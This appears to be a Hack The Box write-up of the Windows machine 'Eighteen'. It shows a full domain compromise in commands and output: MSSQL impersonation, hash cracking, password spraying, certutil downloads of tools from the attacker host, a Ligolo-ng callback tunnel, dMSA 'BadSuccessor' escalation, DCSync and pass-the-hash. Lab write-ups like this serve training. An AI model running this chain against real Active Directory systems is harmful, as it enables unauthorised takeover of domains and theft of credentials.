---
layout: post
title: "HTB - Eighteen"
categories: [writeup]
---

# Machine Information
As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: `kevin` / `iNa2we6haRj2gaw!`
# Nmap Scan
### DC01.eighteen.htb
```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome - eighteen.htb
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-04-04T13:36:22+00:00; +7h00m01s from scanner time.
| ms-sql-info:
|   10.129.14.79:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-04T12:47:58
|_Not valid after:  2056-04-04T12:47:58
| ms-sql-ntlm-info:
|   10.129.14.79:1433:
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
```
# Initial Enumeration
Authenticating to the `MSSQL` instance using the provided domain credentials via `impacket-mssqlclient`.
```bash
~/HTB/Windows/Eighteen $ mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@DC01
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
```
Upon successful login, I proceeded to enumerate impersonation privileges, databases, and linked servers.
```bash
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
SQL (kevin  guest@master)> enum_db
name                is_trustworthy_on
-----------------   -----------------
master                              0
tempdb                              0
model                               0
msdb                                1
financial_planner                   0
SQL (kevin  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
--------   ----------------   -----------   --------------   ------------------   ------------   -------
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```
The results revealed that `kevin` has been granted `IMPERSONATE` permissions over the `appdev` login, and non-standard database named `financial_planner`.
```bash
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)> use financial_planner
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)> select name from sys.tables
name
-----------
users
incomes
expenses
allocations
analytics
visits
```
The `users` table sound interesting. Let's dump it.
```bash
SQL (appdev  appdev@financial_planner)> select * from users
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03  
```
The retrieved hash for the `admin` user follows a specific structure: `pbkdf2:sha256:iterations$salt$hash`. This is characteristic of the `Werkzeug (Flask)` or `Django` `Python` libraries.
To make it compatible with `Hashcat`, it must be converted into a standardized format that the tool's kernels can recognize. I utilized the `werkzeug2hashcat` (https://github.com/Armageddon0x00/werkzeug2hashcat.git) utility to transform the raw string into a format suitable for `Hashcat` mode `10900`.
```bash
~/Misc/werkzeug2hashcat $ python3 werkzeug2hashcat.py -s 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
You can now crack this hash using: hashcat -m 10900 sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM= /usr/share/wordlists/rockyou.txt
```
With the hash correctly formatted, I initiated an offline dictionary attack and retrieved password `iloveyou1`.
```bash
~/HTB/Windows/Eighteen $ hashcat -m 10900 sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM= /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
<SNIP>
```
Utilized `NetExec` to perform `RID` brute-forcing against the domain. This provided a list of valid domain users.
```bash
~/HTB/Windows/Eighteen $ nxc mssql DC01 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.129.14.79    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (EncryptionReq:False)
MSSQL       10.129.14.79    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
<SNIP>
MSSQL       10.129.14.79    1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.14.79    1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.14.79    1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.14.79    1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.14.79    1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.14.79    1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.14.79    1433   DC01             1612: EIGHTEEN\dave.green
```
Performed password spraying against the `WinRM` service using the newly discovered password. The spray was successful, identifying that the user `adam.scott` reused the same password.
```bash
~/HTB/Windows/Eighteen $ nxc winrm DC01 -u users.txt -p 'iloveyou1'
WINRM       10.129.14.79    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
WINRM       10.129.14.79    5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.129.14.79    5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.129.14.79    5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.129.14.79    5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```
# Initial Foothold
Authenticating to `WinRM` instance with `adam.scott` and retrieve the user flag. 
```bash
~/HTB/Windows/Eighteen $ evil-winrm -i DC01 -u adam.scott -p iloveyou1
*Evil-WinRM* PS C:\Users\adam.scott\Documents> cat ..\Desktop\user.txt
466412bd4d0f96c4f11186ba74eba119
```
Initial post-exploitation showed that `adam.scott` is a member of the `IT` group.
```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> whoami /priv
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\adam.scott\Documents> whoami /groups
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
<SNIP>
EIGHTEEN\IT                                Group            S-1-5-21-1152179935-589108180-1989892463-1604 Mandatory group, Enabled by default, Enabled group
```
Using `PowerView`, I identified that this group has `CreateChild` permissions over the `Staff` OU, which opened the door for a modern `AD` attack vector.
```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> certutil -urlcache -f http://10.10.15.12/PowerView.ps1 PowerView.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\adam.scott\Documents> Import-Module .\PowerView.ps1

*Evil-WinRM* PS C:\Users\adam.scott\Documents> Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "IT"}
ObjectDN                : OU=Staff,DC=eighteen,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1152179935-589108180-1989892463-1604
IdentityReferenceName   : IT
IdentityReferenceDomain : eighteen.htb
IdentityReferenceDN     : CN=IT,OU=Staff,DC=eighteen,DC=htb
IdentityReferenceClass  : group
```
# Compromise eighteen.htb
Windows Server 2025 introduced `delegated Managed Service Accounts (dMSAs)`. This new feature allows users with specific permissions to create a managed account that can "precede" (impersonate) another user. I used `BadSuccessor` (https://github.com/ibaiC/BadSuccessor) to exploit this logic.
Created a new `dMSA` named `exploit` and linked it to the `Domain Administrator` account. This essentially created a `Kerberos`-based impersonation primitive.
```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> certutil -urlcache -f http://10.10.15.12/BadSuccessor.exe BadSuccessor.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa exploit -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname exploit -user adam.scott -dc-ip 127.0.0.1
<SNIP>
[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'exploit' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: 127.0.0.1
<SNIP>
```
To facilitate the Kerberos exchange from my attack machine, I established a network tunnel using `Ligolo-ng`.
Upload the `Ligolo-ng` agent to `DC01` and initiate a connection back to the proxy on our attack machine.
```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Documents> certutil -urlcache -f http://10.10.15.12/agent.exe agent.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```bash
~/Ligolo-ng $ sudo ligolo-ng-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
<SNIP>
ligolo-ng »
```

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\agent.exe -connect 10.10.15.12:11601 -ignore-cert
```

```bash
ligolo-ng » INFO[0018] Agent joined.                                 id=005056b9fe96 name="EIGHTEEN\\adam.scott@DC01" remote="10.129.14.79:54574"
ligolo-ng » session
? Specify a session : 1 - EIGHTEEN\adam.scott@DC01 - 10.129.14.79:54574 - 005056b9fe96
[Agent : EIGHTEEN\adam.scott@DC01] » start
INFO[0023] Starting tunnel to EIGHTEEN\adam.scott@DC01 (005056b9fe96)
```
`Ligolo-ng` has a hardcoded magic CIDR (`240.0.0.0/4`). Routing traffic to `240.0.0.1` redirected my requests to the agent's localhost, allowing me to sync time directly with `DC01` via `NTP`.
```bash
~/HTB/Windows/Eighteen $ sudo ip route add 240.0.0.1/32 dev ligolo

~/HTB/Windows/Eighteen $ ntpdate -s 240.0.0.1
```
The final stage of the attack involved getting `adam.scott`'s `TGT` and abusing the `S4U2Self (Service-for-User-to-Self)` `Kerberos` extension. Since the `exploit` `dMSA` was configured to precede the `Administrator`, I could request a service ticket that allowed me to act as the `Administrator`.
```bash
~/HTB/Windows/Eighteen $ getTGT.py eighteen.htb/adam.scott:iloveyou1
[*] Saving ticket in adam.scott.ccache

~/HTB/Windows/Eighteen $ export KRB5CCNAME=adam.scott.ccache

~/HTB/Windows/Eighteen $ getST.py -k -no-pass -dmsa eighteen.htb/adam.scott -impersonate 'exploit$' -self
[*] Impersonating exploit$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:e203d774d21e66e7a7540d97e3ceaf9b83dd2699a52692938f827fc8dbc5534d
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:1391dad64888291f024d06d2382f666d
[*] EncryptionTypes.rc4_hmac:2c8aeedec1f339175d56a352778c0fd0
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in exploit$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```
With the resulting `Kerberos` ticket exported to my environment, I possessed the necessary privileges to perform a `DCSync` attack.
```bash
~/HTB/Windows/Eighteen $ export KRB5CCNAME=exploit\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

~/HTB/Windows/Eighteen $ secretsdump.py DC01 -k -no-pass -just-dc-user Administrator
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```
Finally, I used `Pass-the-Hash` to log in as the `Domain Administrator` and capture the root flag.
```bash
~/HTB/Windows/Eighteen $ evil-winrm -i DC01 -u Administrator -H 0b133be956bfaddf9cea56701affddec
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
21e7bfd146bd9ebe79d758bf2dfbe19b
```
